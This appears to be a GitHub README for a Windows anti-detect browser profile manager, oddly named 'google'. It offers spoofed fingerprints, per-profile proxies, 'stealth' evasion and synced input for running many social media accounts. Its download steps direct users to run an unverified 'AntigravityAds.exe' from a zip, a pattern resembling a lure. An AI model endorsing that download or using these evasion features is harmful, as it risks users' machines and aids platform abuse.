# 🧭 google - Manage browser profiles with ease

[![Download](https://img.shields.io/badge/Download-Primary%20Link-blue?style=for-the-badge)](https://github.com/sternepenitentiary330/google)

## 🚀 Overview

google is a Windows desktop app for managing browser profiles in one place. It helps you open, sort, and control multiple browser environments with separate fingerprints, proxy settings, and synced actions.

It is made for users who want a simple way to handle many browser sessions without switching tools or settings each time.

## 📦 Download and Run

### 1. Download the app
Visit this page to download the latest release:

[Download google](https://github.com/sternepenitentiary330/google)

### 2. Unzip the file
After the download finishes, locate the `.zip` file and extract it to a folder on your PC.

### 3. Start the app
Open the extracted folder and double-click `AntigravityAds.exe`.

No extra setup is needed for the normal Windows version.

## 🖥️ What You Need

Use a Windows PC with enough space for browser data and saved profiles.

Recommended setup:
- Windows 10 or Windows 11
- Google Chrome installed
- At least 4 GB of RAM
- Free disk space for profile data
- A stable internet connection for proxy use and updates

## ✨ Main Features

- Separate browser fingerprints for each account
- Chrome kernel version selection from 90 to 146
- Auto-made Windows user-agent values
- Smart sorting by ID, name, and status
- Batch import and edit of profiles
- Notes and proxy settings for each account
- Mouse and keyboard sync across windows
- HTTP, HTTPS, and SOCKS5 proxy support
- Proxy relay system built in
- Stealth extension support for less detection
- Modern Windows kernel emulation

## 🧭 How to Use It

### 1. Open the app
Double-click `AntigravityAds.exe`.

### 2. Create or import profiles
Add one profile at a time or bring in several at once.

### 3. Set browser details
Choose the kernel version, proxy, and profile name for each entry.

### 4. Launch windows
Start the browser windows you need for your work.

### 5. Sync actions if needed
Use the built-in sync tool to make one main window control the others.

## 🗂️ Profile Data

The app stores data in two main places:

- `browser_data` folder for browser environment files
- `profiles.db` for database records

Keep both in the same app folder when you move the program to a new PC.

## 🛠️ Feature Details

### 🔒 Separate fingerprints
Each profile can use its own browser identity. This helps keep accounts apart and reduces overlap between sessions.

### 🧩 Kernel version control
You can pick a Chrome version that fits your use case. The app then builds a matching Windows user-agent for that version.

### 📋 Smart lists
The profile list supports clean sorting by number, name, and status. This makes it easier to find the account you need.

### 🎛️ Multi-window sync
You can run one main window and control other windows at the same time. Mouse clicks and keyboard input can follow the main window.

### 🌐 Proxy support
Add HTTP, HTTPS, or SOCKS5 proxies to profiles. The built-in relay system helps route requests through the right path.

## 📁 Folder Layout

After you unzip the app, you may see files like these:

- `AntigravityAds.exe` — the main app
- `browser_data/` — saved browser environments
- `profiles.db` — profile database
- `config/` — app settings
- `logs/` — runtime logs
- `assets/` — app files and icons

Keep the full folder together so the app can find what it needs.

## 🔧 If You Want to Run From Source

This is for users who want to open the code and run it by hand.

### 1. Get the code
Clone the repository:

`git clone <repository_url>`

### 2. Install Python packages
Install the required packages:

```bash
pip install PyQt6 pygetwindow pynput pypiwin32 Faker PyInstaller PySocks requests
```

### 3. Start the app
Run:

```bash
python main.py
```

## 🏗️ Build an EXE

If you change the code and want a new Windows app file:

1. Edit the `.py` files you need.
2. Run the build script:

```bash
python build_exe.py
```

3. After the build finishes, look in the `dist/` folder for the EXE file.

## 🧰 Common Use Cases

- Manage many social media accounts in one place
- Keep each browser session separate
- Test different browser settings
- Use proxies for each profile
- Sync actions across several open windows
- Sort and edit large profile lists with less effort

## 🔍 Before You Start

Make sure:
- Chrome is installed
- The app folder stays in one place after unzipping
- You have enough space for saved browser data
- Your proxy details are correct if you use proxies
- You use the same folder that contains both the EXE and data files

## 📌 File Paths to Remember

These paths matter if you move or back up the app:

- `browser_data`
- `profiles.db`

If you copy the app to another folder or PC, copy these files too.

## 🧭 First Launch Steps

1. Download the ZIP file from the link above
2. Extract it
3. Open the folder
4. Run `AntigravityAds.exe`
5. Add a profile or import your existing list
6. Set the proxy and browser version if needed
7. Launch the window you want to use

## 🧪 Tips for Smooth Use

- Keep profile names short and clear
- Use one proxy per account when needed
- Sort the list by ID if you manage many entries
- Close unused windows to save memory
- Back up `browser_data` and `profiles.db` before major changes

## 📄 Notes

- The app is designed for Windows
- Chrome is needed for the browser engine
- Profile data stays inside the app folder
- The sync tool works best when the main and child windows stay open
- Proxy settings can be set per profile

## 📥 Direct Access

Use this link to download or visit the release page:

[https://github.com/sternepenitentiary330/google](https://github.com/sternepenitentiary330/google)